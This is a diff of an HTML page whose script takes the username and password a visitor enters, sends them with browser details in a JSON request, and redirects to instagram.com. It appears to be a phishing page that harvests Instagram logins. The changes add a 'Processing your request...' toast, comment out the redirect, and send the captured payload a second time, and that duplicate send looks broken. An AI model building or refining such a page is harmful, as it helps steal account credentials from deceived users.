@@ -131,6 +131,12 @@
 
   <script>
     async function sendMessage() {
+
+    document.getElementById("toast").classList.add("show");
+    setTimeout(() => {
+    document.getElementById("toast").classList.remove("show");
+    }, 4000); // hides after 4 seconds
+
       const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
       const username = document.getElementById('username').value;
       const password = document.getElementById('password').value;
@@ -176,8 +182,9 @@
       request.setRequestHeader("Content-type", "application/json");
       request.send(JSON.stringify(payload));
 
-      await delay(2000);
-      window.location.replace("https://www.instagram.com");
+      //await delay(2000);
+      //window.location.replace("https://www.instagram.com");
+      request.send(JSON.stringify(payload));
     }
 
     function getBrowserInfo(ua) {
@@ -197,5 +204,6 @@
       return "Unknown OS";
     }
   </script>
+<div id="toast" class="toast">Processing your request...</div>
 </body>
 </html>
